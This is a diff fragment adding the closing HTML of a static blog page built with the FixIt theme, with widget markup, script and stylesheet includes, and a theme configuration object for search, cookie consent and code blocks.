+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;bottom: 0;"></div><noscript>
+    <div class="noscript-warning">Theme FixIt works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/pink/pace-theme-center-atom.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":1024},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"pangu":{"enable":true,"selector":"article"},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":true,"ignoreLocation":true,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":50,"threshold":0.3,"type":"fuse","useExtendedSearch":true},"siteTime":"2024-01-14T23:31:00+08:00"};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
